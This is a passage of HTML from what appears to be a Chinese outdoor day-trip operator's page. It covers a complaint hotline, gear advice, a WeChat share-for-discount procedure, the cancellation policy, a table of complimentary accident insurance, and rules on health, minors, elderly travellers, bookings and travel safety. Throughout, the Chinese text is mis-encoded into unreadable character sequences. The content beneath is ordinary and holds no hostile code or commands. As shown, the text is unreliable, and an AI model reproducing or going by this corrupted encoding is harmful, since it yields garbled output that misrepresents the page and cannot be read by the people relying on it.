ï¼Œæœªå¾—åˆ°æ»¡æ„è§£å†³æ—¶ï¼Œå¯åŠæ—¶æ‹¨æ‰“åŠå…¬å®¤å€¼ç­ç”µè¯18709263033ï¼Œæˆ‘ä»¬ä¼šç¬¬ä¸€æ—¶é—´å¤„ç†ã€‚å¦‚æœåœ¨æ•´ä¸ªæ—…è¡Œè¿‡ç¨‹ä¸­ï¼Œæ‚¨æœªè¿›è¡ŒæŠ•è¯‰ï¼Œè€Œåœ¨ç»“æŸè¡Œç¨‹åæèµ·æŠ•è¯‰çš„è¯ä¸å†å—ç†ã€‚</p><h3 id="è£…å¤‡å»ºè®®"><a href="#è£…å¤‡å»ºè®®" class="headerlink" title="è£…å¤‡å»ºè®®"></a>è£…å¤‡å»ºè®®</h3><p><strong>1.é‹å­ï¼š</strong>ä¼‘é—²æ¸¸ç©è¡Œæ‘„æ´»åŠ¨ï¼Œæ–¹ä¾¿æ´»åŠ¨çš„è¿åŠ¨é‹å³å¯ï¼Œå»ºè®®ä¸è¦ç©¿çš®é‹ã€é«˜è·Ÿé‹å’Œæ‹–é‹ï¼</p><p><strong>2.è£¤å­ï¼š</strong>å®½æ¾é€æ°”è¿åŠ¨è£¤ï¼Œç‰›ä»”è£¤ï¼Œæ–¹ä¾¿æ´»åŠ¨å³å¯ï¼</p><p><strong>3.è¡£æœï¼š</strong>æˆ·å¤–ä¼‘é—²å¯¹äºè¡£æœçš„è¦æ±‚ä¸æ˜¯ç‰¹åˆ«ä¸¥æ ¼ï¼ŒæŒ‰è¥¿å®‰æ¸©åº¦ç€è£…å³å¯ï¼æ‹æ‘„èŠ±å»ºè®®æ¼‚äº®é€‚åˆæ‹ç…§çš„æœè£…ï¼</p><p><strong>4.é¤é¥®ï¼š</strong>é¤é£Ÿå’Œé¥®ç”¨æ°´è‡ªç†ï¼Œè¯·æŒ‰æ´»åŠ¨è¡Œç¨‹å†…çš„æç¤ºé…Œæƒ…å‡†å¤‡ï¼</p><p><strong>5.æ‹æ‘„ï¼š</strong>è¯·è‡ªè¡Œæºå¸¦æ‰‹æœºã€ç›¸æœºã€å……ç”µå®ç­‰æ‹æ‘„å·¥å…·ï¼</p><p><strong>6.è¯ä»¶ï¼š</strong>è¯·æºå¸¦æœ‰æ•ˆèº«ä»½è¯è¯ä»¶å’Œä¼˜æƒ è¯ä»¶ï¼</p><p><strong>7.è¯å“ï¼š</strong>ä¸ªäººå¸¸å¤‡è¯å“ï¼Œæ™•è½¦è¯ï¼Œæ„Ÿå†’è¯ï¼Œæ¶ˆåŒ–ç³»ç»Ÿè¯ç­‰</p><p><strong>8.å…¶ä»–ï¼š</strong>å°èƒŒåŒ…ï¼Œå¡‘æ–™è¢‹ï¼Œé›¨å…·ç­‰ä¸ªäººå…¶ä»–ç‰©å“</p><h3 id="åˆ†äº«ä¼˜æƒ "><a href="#åˆ†äº«ä¼˜æƒ " class="headerlink" title="åˆ†äº«ä¼˜æƒ "></a>åˆ†äº«ä¼˜æƒ </h3><p>1.æ‰“å¼€å¾®ä¿¡æœç´¢â€œ<strong>é©´çªæˆ·å¤–</strong>â€</p><p>2.æ‰¾åˆ°â€œ<strong>é©´çªæˆ·å¤–</strong>â€å…¬ä¼—å¾®ä¿¡å·å¹¶å…³æ³¨</p><p>3.é€‰æ‹©ä¸‹æ–¹â€œ<strong>æˆ‘çš„æ—…è¡Œ</strong>â€é€‰é¡¹æ‰¾åˆ°å¯¹åº”æ´»åŠ¨</p><p>4.æ‰“å¼€æ´»åŠ¨å³ä¸Šè§’â€œâ€¦â€</p><p>5.é€‰æ‹©åˆ†äº«åˆ°æœ‹å‹åœˆ</p><p>6.è½¦ä¸Šé¢†é˜Ÿæ”¶è´¹æ—¶æ‰“å¼€åˆ†äº«è®°å½•</p><p>7.é¢†é˜Ÿç¡®è®¤åç›´æ¥æŒ‰ä¼˜æƒ ä»·æ‰§è¡Œ</p><h3 id="é€€æ”¹æ”¿ç­–"><a href="#é€€æ”¹æ”¿ç­–" class="headerlink" title="é€€æ”¹æ”¿ç­–"></a>é€€æ”¹æ”¿ç­–</h3><p>å› ç›®å‰ä¸€æ—¥æ¸¸æ´»åŠ¨ä¸ºè½¦ä¸Šç¼´è´¹ï¼Œè¯·å¤§å®¶è¯šä¿¡æŠ¥åï¼</p><p>1.å‡ºå‘å‰ä¸€å¤©æ´»åŠ¨å–æ¶ˆå¯è‡ªè¡Œåœ¨ä¸ªäººä¸­å¿ƒï¼Œæ´»åŠ¨è®¢å•é‡Œè¿›è¡Œå–æ¶ˆæˆ–å¢å‡äººæ•°ï¼</p><p>2.å¦‚å‡ºå‘å½“å¤©æ‚¨æœ‰æ€¥äº‹æ— æ³•æ­£å¸¸å‚åŠ æ´»åŠ¨è¯·åŠæ—¶è”ç³»æˆ‘ä»¬å®¢æœæˆ–è€…é¢†é˜Ÿè¿›è¡Œå‘ŠçŸ¥ï¼</p><p>â€»æ— æ•…æŠ¥ååä¸å‚åŠ è€…ï¼ŒæŠ¥åç¨‹åº¦åº¦ä¼šé™ä½ï¼Œä¼šå½±å“æ‚¨ä»¥åçš„æŠ¥åå’Œäº«å—ä»¥åçš„å…¶ä»–æƒç›Šï¼</p><h3 id="å…³äºä¿é™©"><a href="#å…³äºä¿é™©" class="headerlink" title="å…³äºä¿é™©"></a>å…³äºä¿é™©</h3><p>æˆ‘ä»¬æ‰€æœ‰æ´»åŠ¨éƒ½ç»™å¤§å®¶èµ é€ä¿é™©ï¼Œä½†éœ€è¦æ‚¨é…åˆæˆ‘ä»¬æä¾›ç»™æˆ‘ä»¬æ‰€æœ‰å‚ä¸æ´»åŠ¨äººå‘˜çš„çœŸå®å§“åå’Œèº«ä»½è¯å·ç ,ä¸æä¾›è€…æˆ–æä¾›ä¸å…¨è€…è§†ä¸ºæ”¾å¼ƒä¿é™©ï¼</p><p><em>æˆ‘ä»¬å»ºè®®æ‚¨æ ¹æ®è‡ªèº«æƒ…å†µç»“åˆæˆ‘ä»¬èµ é€çš„ä¿é™©ï¼Œå†è‡ªè¡Œè´­ä¹°å…¶ä»–ç±»å‹çš„ä¿é™©ï¼ï¼ï¼ï¼ï¼</em></p><p>ä¿é™©è´­ä¹°æ—¶é—´ä¸€èˆ¬åœ¨æ´»åŠ¨å‡ºå‘å‰ä¸€å¤©ä¸‹åˆè´­ä¹°ï¼</p><p>æˆ‘ä»¬ä¸ºå¤§å®¶èµ é€çš„ä¿é™©ä¸ºä»¥ä¸‹å†…å®¹ï¼š</p><table><thead><tr><th>ç¬¬1éƒ¨åˆ†ï¼šæ„å¤–ä¼¤å®³åŠåŒ»ç–—ä¿éšœ</th><th></th></tr></thead><tbody><tr><td>æ„å¤–èº«æ•…&#x2F;æ®‹ç–¾</td><td>20ä¸‡å…ƒ</td></tr><tr><td>æ„å¤–åŒ»ç–—</td><td>2ä¸‡å…ƒ</td></tr><tr><td>æ„å¤–ä½é™¢æ´¥è´´ï¼ˆ50å…ƒ&#x2F;å¤©ï¼Œ30å¤©ä¸ºé™ï¼‰</td><td>50å…ƒ&#x2F;å¤©</td></tr><tr><td>æ€¥æ€§ç—…èº«æ•…</td><td>1ä¸‡å…ƒ</td></tr><tr><td>æ€¥æ€§ç—…åŒ»ç–—</td><td>2ä¸‡å…ƒ</td></tr><tr><td>ç¬¬2éƒ¨åˆ†ï¼šç”Ÿå‘½å¥åº·åŠåŒ»ç–—ä¿éšœ</td><td></td></tr><tr><td>æ€¥æ€§ç—…ä½é™¢æ´¥è´´</td><td>10å…ƒ&#x2F;å¤©</td></tr></tbody></table><p>ä¿é™©çš„è¯¦ç»†æ¡æ¬¾é“¾æ¥ï¼š</p><p><a href="https://www.029lvwo.com/public/insurance/plan-b/">æ…§æ—…æ¸¸-ä»»æ€§æ¸¸â€”â€”è®¡åˆ’B</a></p><p><strong>å¦‚æœå› è‡ªèº«åŸå› å‡ºç°äººèº«åŠè´¢äº§æŸå¤±ï¼Œå°†æŒ‰æœ‰å…³æ³•å¾‹ã€æ³•è§„åŠä¿é™©åˆåŒçº¦å®šç”±ä¿é™©å…¬å¸è¿›è¡Œèµ”å¿ï¼›ä¿é™©å…¬å¸ä¸æ‰¿æ‹…çš„éƒ¨åˆ†åˆ™ç”±å‚å›¢äººå‘˜è‡ªè¡Œæ‰¿æ‹…ï¼</strong></p><p><strong>å¸Œæœ›å¤§å®¶çŸ¥æ‚‰ï¼</strong></p><h3 id="å…¶ä»–äº‹é¡¹"><a href="#å…¶ä»–äº‹é¡¹" class="headerlink" title="å…¶ä»–äº‹é¡¹"></a>å…¶ä»–äº‹é¡¹</h3><p><strong>ä¸€ã€é¢„å®šé™åˆ¶</strong></p><p>1ã€å¥åº·çº¦å®šï¼šæœ¬äº§å“ä¸æ¥å—ä»¥ä¸‹ç—…æ‚£è€…æŠ¥åï¼šä¼ æŸ“æ€§ç–¾ç—…ã€å¿ƒè¡€ç®¡ç–¾ç—…ã€è„‘è¡€ç®¡ç–¾ç—…ã€å‘¼å¸ç³»ç»Ÿç–¾ç—…ã€ç²¾ç¥ç—…ã€ä¸¥é‡è´«è¡€ç—…ã€å¤§ä¸­å‹æ‰‹æœ¯çš„æ¢å¤æœŸç—…æ‚£è€…ã€å­•å¦‡åŠè¡ŒåŠ¨ä¸ä¾¿è€…ä»¥åŠå…¶ä»–ä¸é€‚å®œå‡ºè¡Œè€…ã€‚å‡ºäºæ—…æ¸¸å®‰å…¨è€ƒè™‘ï¼Œè¯·æ—…æ¸¸è€…æ¸…æ¥šä¸ªäººèº«ä½“æƒ…å†µæ˜¯å¦é€‚åˆæœ¬æ¬¡è¡Œç¨‹ï¼Œæœ‰å¿…è¦çš„æƒ…å†µä¸‹åšä¸€æ¬¡èº«ä½“æ£€æŸ¥ï¼Œé¢„è®¢äººè¯·åŠ¡å¿…å‡†ç¡®ã€åŠæ—¶è½¬è¾¾å¹¶æ ¸å®æ—…æ¸¸è€…çš„èº«ä½“çŠ¶å†µåå†æŠ¥åï¼Œå¦åˆ™ç”±æ­¤å¼•å‘çš„ä¸è‰¯åæœå’Œæ‰€æœ‰è´¹ç”¨ç”±é¢„è®¢äººå’Œæ—…æ¸¸è€…è‡ªè¡Œæ‰¿æ‹…ã€‚</p><p>2ã€æœªæˆå¹´äººçº¦å®šï¼š18å‘¨å²ä»¥ä¸‹æœªæˆå¹´äººé¡»ç”±çˆ¶æ¯æŠ¥åæ–¹å¯å‡ºè¡Œï¼›16å‘¨å²ä»¥ä¸‹æœªæˆå¹´äººéœ€ç”±çˆ¶æ¯æˆ–ç”±çˆ¶æ¯æŒ‡å®šçš„ä¸´æ—¶ç›‘æŠ¤äººé™ªåŒï¼Œå¦‚åŒè¡Œäººå‘˜ä¸­æœ‰æœªæˆå¹´äººæ— çˆ¶æ¯é™ªåŒå‡ºæ¸¸çš„ï¼ŒåŒè¡Œçš„æˆå¹´å‡ºæ¸¸äººå‡è§†ä¸ºæœªæˆå¹´äººçš„ä¸´æ—¶ç›‘æŠ¤äººï¼Œè´Ÿè´£å…¨ç¨‹çœ‹ç®¡ã€ç…§é¡¾æœªæˆå¹´äººï¼Œå¦‚éšç’å‚å›¢å‘ç”Ÿäº‹æ•…ï¼Œè´£ä»»è‡ªè´Ÿã€‚å¦‚æœ‰éšç’æœªæˆå¹´äººèº«ä»½ä¿¡æ¯çš„ï¼Œæ³•å¾‹è´£ä»»è‡ªè¡Œæ‰¿æ‹…ã€‚</p><p>3ã€è€å¹´äººçº¦å®šï¼š70å‘¨å²ï¼ˆå«ï¼‰ä»¥ä¸Šè€å¹´äººå¿…é¡»åœ¨æœ‰è‡³å°‘1ä½18å‘¨å²-69å‘¨å²äº²å‹é™ªåŒçš„æƒ…å†µä¸‹æ–¹å¯å‡ºè¡Œã€‚é©´çªæˆ·å¤–çš„æ—…æ¸¸è¡Œç¨‹å¯¹æ—…æ¸¸è€…ä½“èƒ½æœ‰ä¸€å®šè¦æ±‚ï¼šè¡Œç¨‹ä¸­å¯èƒ½é€”å¾„é«˜å±±æˆ–ä½è°·åœ°åŒºï¼Œé€šå¸¸åœ¨å¹³åŸç”Ÿæ´»çš„äººä¼šæœ‰èº«ä½“ä¸é€‚æˆ–å¼ºçƒˆçš„åº”æ¿€ååº”ï¼›ç«è½¦ã€é£æœºã€è½®èˆ¹ã€æ±½è½¦ç­‰äº¤é€šå·¥å…·ä¸Šå‡å‡ºç°è¿‡è€å¹´äººå› èº«ä½“ä¸é€‚è€Œå‘ç”Ÿäººèº«æ„å¤–ä¼¤å®³çš„äº‹æ•…ï¼ŒåŒæ—¶ä¹Ÿä¼šæœ‰å¾’æ­¥éœ€è¦ä¸€å®šä½“èƒ½è¦æ±‚çš„è¡Œç¨‹çº¿è·¯ï¼Œä¸ºä¿è¯æ—…æ¸¸å®‰å…¨å’Œé¡ºåˆ©è¿›è¡Œï¼Œè€å¹´äººå¿…é¡»åœ¨ç¡®ä¿èº«ä½“è‰¯å¥½çš„æƒ…å†µä¸‹å‚åŠ ï¼Œå¦‚æœ‰ç‰¹æ®Šç—…å²æˆ–æœ‰ä¸å®œå‚åŠ çš„æ—…ç¨‹ï¼ˆé¡¹ç›®ï¼‰åº”åŠæ—¶ä¹¦é¢å‘ŠçŸ¥å·¥ä½œäººå‘˜ï¼Œå¦‚æœ‰éšç’èº«ä½“å¥åº·çŠ¶å†µçš„ï¼Œç”±æ­¤å¼•å‘çš„ä¸è‰¯åæœå’Œæ‰€æœ‰è´¹ç”¨ç”±æœ¬äººè‡ªè¡Œæ‰¿æ‹…ã€‚</p><p><strong>äºŒã€é¢„å®šé¡»çŸ¥</strong></p><p>1ã€è¯·æ‚¨åœ¨é¢„è®¢æ—¶åŠ¡å¿…æä¾›å‡†ç¡®ã€å®Œæ•´çš„ä¿¡æ¯ï¼ˆå§“åã€æ€§åˆ«ã€è¯ä»¶å·ç ã€è”ç³»æ–¹å¼ã€æ˜¯å¦æœ‰ç‰¹æ®Šè¯ä»¶ï¼‰ï¼Œä»¥å…äº§ç”Ÿé¢„è®¢é”™è¯¯ï¼Œå½±å“å‡ºè¡Œã€‚å¦‚å› å®¢äººæä¾›é”™è¯¯ä¸ªäººä¿¡æ¯è€Œé€ æˆæŸå¤±ï¼Œåº”ç”±å®¢äººè‡ªè¡Œæ‰¿æ‹…å› æ­¤äº§ç”Ÿçš„å…¨éƒ¨æŸå¤±ã€‚</p><p>2ã€å› æ„å¤–äº‹ä»¶æˆ–ä¸å¯æŠ—åŠ›ï¼ŒåŒ…æ‹¬ä½†ä¸é™äºäº¤é€šå»¶é˜»ã€ç½¢å·¥ã€å¤©æ°”ã€é£æœºç«è½¦æ•…éšœã€èˆªç­å–æ¶ˆæˆ–æ›´æ”¹æ—¶é—´åŠçªå‘ç–«æƒ…ç­‰ä¸å¯å½’è´£äºæ—…è¡Œç¤¾çš„åŸå› å¯¼è‡´è¡Œç¨‹å–æ¶ˆæˆ–å˜æ›´çš„ï¼Œæ—…æ¸¸è€…ä¸æ—…è¡Œç¤¾å‡ä¸æ‰¿æ‹…è¿çº¦è´£ä»»ï¼Œæˆ‘ä»¬å°†å°½æœ€å¤§çš„åŠªåŠ›ååŠ©æ‚¨åŠç†å˜æ›´äº‹å®œï¼Œå¦‚äº§ç”Ÿå·®ä»·ï¼Œå¤šé€€å°‘è¡¥ã€‚å¦‚æ‚¨è¦æ±‚è§£é™¤åˆåŒçš„ï¼Œå°†æŒ‰ç…§ã€Šæ—…æ¸¸æ³•ã€‹ç¬¬67æ¡å¤„ç†ã€‚</p><p>3ã€æˆ·å¤–çº¿è·¯ã€åè¿œåœ°åŒºçº¿è·¯ç”±äºè·¯é€”ç›¸å¯¹è¾ƒä¸ºè‰°è¾›ï¼Œå„é¡¹æ¡ä»¶æ¯”ä¸ä¸Šå‘è¾¾åœ°åŒºï¼Œå¸Œæœ›å‚åŠ è€…æœ‰åˆç†çš„å¿ƒç†é¢„æœŸã€‚æ‘„å½±çº¿è·¯ç”±äºå…¶çº¿è·¯çš„ç‰¹æ®Šæ€§ï¼Œæ‹æ‘„éœ€è¦æ—©å‡ºæ™šå½’ï¼Œå‚åŠ è€…é¡»å¯¹è‡ªèº«èº«ä½“çŠ¶å†µæœ‰åˆç†çš„åˆ¤æ–­ï¼Œæœ‰é«˜è¡€å‹ã€å¿ƒè„ç—…ã€å† å¿ƒç—…ç­‰å¿ƒè¡€ç®¡ç–¾ç—…çš„é˜Ÿå‘˜è°¢ç»å‚åŠ ã€‚ä»£ä»–äººæŠ¥åè€…ï¼Œé¡»å‡†ç¡®ã€åŠæ—¶è½¬å‘Šã€‚</p><p>4ã€æŠ¥åæˆåŠŸåï¼Œæœ€æ™šåœ¨å‡ºè¡Œå‰1å¤©æ‚¨å°†æ”¶åˆ°å‡ºå›¢çŸ­ä¿¡æˆ–å·¥ä½œäººå‘˜çš„ç¡®è®¤ç”µè¯ï¼Œæ•¬è¯·ç•™æ„ï¼Œä¿æŒç”µè¯ç•…é€šã€‚é›†åˆæ—¶é—´è¯·ä»¥å‡ºå›¢é€šçŸ¥ä¹¦æˆ–å·¥ä½œäººå‘˜çŸ­ä¿¡é€šçŸ¥ä¸ºå‡†ã€‚è‹¥è¶…æ—¶æœªè”ç³»ï¼Œè¯·è”ç³»å®¢æœäººå‘˜ã€‚å‡ºè¡Œå½“æ—¥è¯·å‡­é¢„ç•™çš„å‡ºè¡Œäººå§“å+è”ç³»æ‰‹æœºåœ¨çº¦å®šæ—¶é—´å‰ï¼Œå‰å¾€çº¦å®šåœ°ç‚¹ç­‰å€™ã€‚</p><p>5ã€ å¦‚ç½‘é¡µäº§å“çš„æ¡æ¬¾çº¦å®šä¸æ—…æ¸¸åˆåŒä¸»åè®®ï¼ˆç¤ºèŒƒæ–‡æœ¬ï¼‰ä¸ä¸€è‡´çš„ï¼Œä»¥ç½‘é¡µçš„çº¦å®šä¸ºå‡†ã€‚</p><p><strong>ä¸‰ã€äº§å“è¯´æ˜</strong></p><p>1ã€ä½å®¿è¯´æ˜ï¼šä¸€èˆ¬æŒ‰ç…§2æˆäººå…¥ä½1é—´æˆ¿ï¼ˆå³1æˆäºº1ä¸ªåºŠä½ï¼Œè¡Œç¨‹ä¸­è¡¨æ˜å¤šäººé—´çš„é™¤å¤–ï¼‰ã€‚å¦‚æ‚¨æŠ¥åä¸ºå•äººï¼Œå°†å°½é‡å®‰æ’ä¸å…¶ä»–åŒæ€§åˆ«å›¢å‹æˆ–éšå›¢å·¥ä½œäººå‘˜æ‹¼æˆ¿ï¼›å¦‚ä¸æ„¿æ‹¼æˆ¿ï¼Œæ‚¨éœ€è‡ªç†å•æˆ¿å·®ä»¥äº«ç”¨æ•´ä¸ªæˆ¿é—´ã€‚å•ç”·å•å¥³æŠ¥ååœ¨åŒä¸€è®¢å•ä¸‹ï¼Œå¦‚æœªåœ¨å¤‡æ³¨æ ç‰¹åˆ«è¯´æ˜ï¼Œé»˜è®¤å®‰æ’ä½ä¸€é—´æˆ¿ã€‚</p><p>2ã€å›¢é˜Ÿè¡Œç¨‹ä¸­ï¼Œéè‡ªç”±æ´»åŠ¨æœŸé—´ï¼Œæœªç»å¸¦é˜Ÿé˜Ÿé•¿åŒæ„ï¼Œæ—…æ¸¸è€…ä¸å¾—æ“…è‡ªç¦»å›¢æˆ–è„±å›¢ã€‚å¦‚å› ä¸ªäººåŸå› ä¸å¾—ä¸ä¸­é€”é€€å‡ºçš„ï¼Œç¦»å›¢æˆ–è„±å›¢åå¯èƒ½å‘ç”Ÿçš„ä»»ä½•æ„å¤–éœ€æ‚¨è‡ªè¡Œæ‰¿æ‹…è´£ä»»ï¼Œæœªå®Œæˆéƒ¨åˆ†å°†è¢«è§†ä¸ºæ‚¨è‡ªè¡Œæ”¾å¼ƒï¼Œå·²å®é™…äº§ç”ŸæŸå¤±çš„è¡Œç¨‹ï¼Œä¸é€€ä»»ä½•è´¹ç”¨ã€‚</p><p>3ã€èµ é€é¡¹ç›®ï¼Œæ—…è¡Œç¤¾ä¸æ‰¿æ‹…é€€è´¹æˆ–è€…èµ”å¿çš„è´£ä»»ã€‚å®¢äººæœ‰æƒé€‰æ‹©å‚åŠ æˆ–è€…ä¸å‚åŠ ï¼Œå¦‚å› æ™¯åŒºçš„åŸå› æˆ–è€…ä¸å¯æŠ—åŠ›ç­‰å®¢è§‚å› ç´ åˆ™å–æ¶ˆè¯¥é¡¹ç›®å®‰æ’ã€‚</p><p>4ã€å‡ºæ¸¸è¿‡ç¨‹ä¸­ï¼Œå¦‚é‡ä¸å¯æŠ—åŠ›å› ç´ é€ æˆæœªèƒ½æ­£å¸¸æ¸¸ç©æ™¯ç‚¹ï¼Œç»ä¸æ—…æ¸¸è€…åå•†åå¯æ ¹æ®å®é™…æƒ…å†µå–æ¶ˆæˆ–æ›´æ¢è¯¥æ™¯ç‚¹ï¼Œæˆ–ç”±æ—…è¡Œç¤¾åœ¨ç°åœºæŒ‰æ—…æ¸¸äº§å“ä¸­çš„é—¨ç¥¨ä»·é€€è¿˜è´¹ç”¨ï¼Œé€€è´¹ä¸ä»¥æ™¯åŒºæŒ‚ç‰Œä»·ä¸ºå‡†ï¼Œæ•¬è¯·è°…è§£ã€‚</p><p>5ã€æœ¬äº§å“è¡Œç¨‹å®é™…å‡ºè¡Œä¸­ï¼Œåœ¨ä¸å‡å°‘æ™¯ç‚¹ä¸”å¾å¾—å®¢äººåŒæ„çš„å‰æä¸‹ï¼Œéšå›¢å·¥ä½œäººå‘˜æˆ–å¸¦é˜Ÿé˜Ÿé•¿ã€å¸æœºå¯èƒ½ä¼šæ ¹æ®å¤©æ°”ã€äº¤é€šç­‰æƒ…å†µï¼Œå¯¹æ‚¨çš„è¡Œç¨‹è¿›è¡Œé€‚å½“è°ƒæ•´ï¼ˆå¦‚è°ƒæ•´æ™¯ç‚¹æ¸¸è§ˆé¡ºåºç­‰ï¼‰ï¼Œä»¥ç¡®ä¿è¡Œç¨‹é¡ºåˆ©è¿›è¡Œã€‚</p><p>6ã€è¯·åœ¨çº¦å®šçš„æ—¶é—´åˆ°è¾¾ä¸Šè½¦åœ°ç‚¹é›†åˆï¼Œåˆ‡å‹¿è¿Ÿåˆ°ï¼Œä»¥å…è€½è¯¯å…¶ä»–æ¸¸å®¢è¡Œç¨‹ã€‚è‹¥å› è¿Ÿåˆ°å¯¼è‡´æ— æ³•éšå›¢æ¸¸è§ˆï¼Œä¹Ÿæœªèƒ½åœ¨å‡ºå‘é€”ä¸­åŠ å…¥æ—…æ¸¸å›¢é˜Ÿçš„ï¼Œè§†ä¸ºæ—…æ¸¸è€…åœ¨å‡ºå‘å½“æ—¥è§£é™¤åˆåŒã€‚</p><p>7ã€å‡ºæ¸¸è¿‡ç¨‹ä¸­ï¼Œå¦‚äº§ç”Ÿé€€è´¹æƒ…å†µï¼ŒæŒ‰é€€è´¹é¡¹ç›®æ—…è¡Œç¤¾æŠ˜æ‰£ä»·é€€è¿˜è´¹ç”¨ï¼Œä¸ä»¥æ™¯åŒºæŒ‚ç‰Œä»·ä¸ºå‡†ï¼Œæ•¬è¯·è°…è§£ã€‚</p><p>8ã€å…·ä½“é…’åº—ä¿¡æ¯ï¼Œè¯·ä»¥æœ€ç»ˆé€šçŸ¥ä¸ºå‡†ã€‚</p><p><strong>å››ã€å‘ç¥¨ç´¢å–</strong></p><p>å‘ç¥¨å¼€å…·æœ‰æ•ˆæœŸï¼š1ä¸ªæœˆï¼ˆè‡ªæ´»åŠ¨ç»“æŸä¹‹æ—¥èµ·ï¼Œä¸€ä¸ªæœˆå†…å¯ç”³è¯·ç™»è®°å‘ç¥¨ä¿¡æ¯ï¼Œé€¾æœŸè§†ä¸ºè‡ªåŠ¨æ”¾å¼ƒå¼€å…·å‘ç¥¨ï¼‰ï¼Œè”ç³»å®¢æœç´¢å–å‘ç¥¨ç”³è¯·ï¼Œå¦‚æœ‰ç–‘é—®è¯·ç”µè¯¢ã€‚</p><p><strong>äº”ã€åˆåŒå’Œå‡ºå›¢é€šçŸ¥</strong></p><p>åˆåŒï¼šå‡ºå›¢å‰1å¤©æˆ–å‡ºå›¢å½“å¤©è½¦ä¸Šé¢†é˜ŸååŠ©ç­¾è®¢ç”µå­åˆåŒã€‚</p><p>è¡Œç¨‹é€šçŸ¥ï¼šå·¥ä½œäººå‘˜å°†åœ¨å‡ºè¡Œå‰ï¼Œé€šè¿‡çŸ­ä¿¡é€šçŸ¥ã€‚é›†åˆæ—¶é—´ã€åœ°ç‚¹è¯·ä»¥çŸ­ä¿¡é€šçŸ¥ä¸ºå‡†ã€‚è¯·ä¿æŒç”µè¯ç•…é€šï¼Œä»¥ä¾¿å·¥ä½œäººå‘˜å¯ä»¥è”ç³»ä¸Šæ‚¨ã€‚</p><p><strong>å…­ã€å‡ºè¡ŒæŒ‡å—</strong></p><p>1ã€å‡ºè¡ŒæœŸé—´è¯·éšèº«æºå¸¦æœ¬äººçš„èº«ä»½è¯æ˜åŸä»¶ï¼ˆå¢ƒå†…æºå¸¦èº«ä»½è¯ï¼Œå¢ƒå¤–æºå¸¦æŠ¤ç…§ï¼‰ï¼Œæœªæ»¡16å‘¨å²è€…è¯·æºå¸¦æˆ·å£æœ¬åŸä»¶ï¼›è¶…è¿‡16å‘¨å²çš„æ¸¸å®¢è‹¥æ²¡æœ‰åŠç†èº«ä»½è¯ï¼Œè¯·åœ¨æˆ·å£æ‰€åœ¨åœ°å¼€å…·ç›¸å…³èº«ä»½è¯æ˜ï¼Œä»¥å…å½±å“ç™»æœºæˆ–é…’åº—å…¥ä½ã€‚å‡ºè¡Œå‰è¯·åŠ¡å¿…æ£€æŸ¥è‡ªå·±è¯ä»¶çš„æœ‰æ•ˆæœŸï¼ˆæŠ¤ç…§éœ€è¦ä¿è¯è‡³å°‘6ä¸ªæœˆæœ‰æ•ˆæœŸï¼‰ã€‚</p><p>2ã€åœ¨æ—…æ¸¸è¡Œç¨‹ä¸­ï¼Œä¸ªåˆ«æ™¯ç‚¹æ™¯åŒºã€é¤å…ã€ä¼‘æ¯åŒºç­‰åœºæ‰€å­˜åœ¨å•†åœºç­‰è´­ç‰©åœºæ‰€ï¼Œä¸Šè¿°åœºæ‰€éæ—…è¡Œç¤¾å®‰æ’çš„æŒ‡å®šè´­ç‰©åœºæ‰€ã€‚è¯·æ‚¨æ ¹æ®è‡ªèº«éœ€è¦ï¼Œç†æ€§æ¶ˆè´¹å¹¶ç´¢è¦å¿…è¦ç¥¨æ®ã€‚å¦‚äº§ç”Ÿæ¶ˆè´¹äº‰è®®ï¼Œè¯·è‡ªè¡Œæ‰¿æ‹…ç›¸å…³è´£ä»»ï¼Œç”±æ­¤å¸¦æ¥çš„ä¸ä¾¿ï¼Œæ•¬è¯·è°…è§£ï¼</p><p>3ã€ä¸ºäº†æ‚¨äººèº«ã€è´¢äº§çš„å®‰å…¨ï¼Œè¯·æ‚¨é¿å…åœ¨å…¬å¼€åœºåˆæš´éœ²è´µé‡ç‰©å“åŠå¤§é‡ç°é‡‘ã€‚åœ¨æ—…æ¸¸è¡Œç¨‹ä¸­éœ€æ—¶åˆ»çœ‹ç®¡å¥½é¦–é¥°ã€ç›¸æœºç­‰éšèº«ç‰©å“ã€‚</p><p>4ã€åœ¨è‡ªè¡Œå®‰æ’æ´»åŠ¨æœŸé—´ï¼Œæ—…æ¸¸è€…åº”åœ¨è‡ªå·±èƒ½å¤Ÿæ§åˆ¶é£é™©çš„èŒƒå›´å†…æ´»åŠ¨ï¼Œé€‰æ‹©è‡ªå·±èƒ½å¤Ÿæ§åˆ¶é£é™©çš„æ´»åŠ¨é¡¹ç›®ï¼Œå¹¶å¯¹è‡ªå·±çš„å®‰å…¨è´Ÿè´£ã€‚æ—…è¡Œç¤¾ä¸æ‰¿æ‹…åœ¨æ­¤æœŸé—´å› æ—…æ¸¸è€…è‡ªèº«åŸå› æˆ–è¿‡é”™å¯¼è‡´çš„äººèº«ã€è´¢äº§æŸå¤±çš„è´£ä»»ã€‚è‡ªè¡Œå®‰æ’æ´»åŠ¨æœŸé—´åŒ…æ‹¬æ—…è¡Œç¤¾å®‰æ’çš„åœ¨æ—…æ¸¸è¡Œç¨‹ä¸­ç‹¬ç«‹çš„è‡ªç”±æ´»åŠ¨æœŸé—´ã€æ—…æ¸¸è€…ä¸å‚åŠ æ—…æ¸¸è¡Œç¨‹çš„æ´»åŠ¨æœŸé—´ä»¥åŠæ—…æ¸¸è€…ç»å¯¼æ¸¸æˆ–éšå›¢å·¥ä½œäººå‘˜ï¼ˆå¸¦é˜Ÿé˜Ÿé•¿ï¼‰åŒæ„æš‚æ—¶ç¦»é˜Ÿçš„ä¸ªäººæ´»åŠ¨æœŸé—´ç­‰ã€‚æ—…æ¸¸æœŸé—´åŠè‡ªè¡Œå®‰æ’æ´»åŠ¨æœŸé—´è¯·æ³¨æ„äººèº«å’Œè´¢äº§å®‰å…¨ã€‚</p><p>5ã€åœ¨æ°´ä¸Šï¼ˆåŒ…æ‹¬æ±Ÿæ²³ã€æ¹–æµ·ã€æ°´åº“ï¼‰æ¸¸è§ˆæˆ–è€…æ´»åŠ¨æ—¶ï¼Œæ—…æ¸¸è€…è¦æ³¨æ„ä¹˜èˆ¹å®‰å…¨ã€‚ä¸å¯å•ç‹¬å‰å¾€æ·±æ°´æ°´åŸŸæˆ–è€…å±é™©æ²³é“ï¼Œé€‰æ‹©æ°´ä¸‹æ¸¸æ³³æ—¶ï¼Œåº”åšå¥½å®‰å…¨ä¿éšœæªæ–½ï¼Œæºå¸¦æ•‘ç”Ÿè®¾å¤‡åŠ©æ¸¸ï¼›æ—…æ¸¸è€…ç»è¿‡å±é™©åœ°æ®µï¼ˆå¦‚é™¡å³­ã€ç‹­çª„ã€æ¹¿æ»‘çš„é“è·¯ç­‰